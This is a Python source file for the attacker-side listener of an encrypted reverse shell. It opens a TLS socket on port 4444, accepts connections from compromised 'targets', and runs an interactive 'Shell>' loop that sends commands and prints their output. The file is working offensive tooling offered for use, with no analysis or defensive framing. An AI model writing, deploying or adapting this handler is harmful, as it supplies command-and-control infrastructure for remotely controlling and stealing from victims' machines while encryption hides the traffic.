import socket
import ssl
import sys

def start_listener():
    listen_ip = '0.0.0.0'  # Listens on all interfaces for incoming connections
    listen_port = 4444

    # 1. Configure the SSL Context to match the client
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.load_cert_chain(certfile="server.crt", keyfile="server.key")
    except FileNotFoundError:
        print("[-] Error: server.crt or server.key not found. Did you run the OpenSSL command?")
        sys.exit(1)

    # 2. Setup the raw TCP socket
    bind_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bind_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
    bind_socket.bind((listen_ip, listen_port))
    bind_socket.listen(5)

    print(f"[*] Listening for encrypted connections on {listen_ip}:{listen_port}...")

    while True:
        try:
            # 3. Accept the raw connection
            newsocket, fromaddr = bind_socket.accept()
            print(f"[+] Connection received from {fromaddr[0]}:{fromaddr[1]}")

            # 4. Wrap the raw socket in the SSL context
            secure_socket = context.wrap_socket(newsocket, server_side=True)
            print("[+] SSL Handshake successful. Shell is active.\n")
            
            # 5. Command loop
            handle_connection(secure_socket)

        except Exception as e:
            print(f"[-] Connection error: {e}")
            print("[*] Resuming listening state...")

def handle_connection(secure_socket):
    while True:
        try:
            command = input("Shell> ")
            
            # Handle empty inputs gracefully
            if not command.strip():
                continue

            secure_socket.send(command.encode('utf-8'))

            if command.lower() == 'exit':
                print("[*] Closing connection.")
                secure_socket.close()
                break

            # Receive the output from the client
            output = secure_socket.recv(4096).decode('utf-8')
            print(output)

        except (ConnectionResetError, BrokenPipeError):
            print("[-] The target actively dropped the connection.")
            secure_socket.close()
            break
        except Exception as e:
            print(f"[-] Error during communication: {e}")
            secure_socket.close()
            break

if __name__ == "__main__":
    start_listener()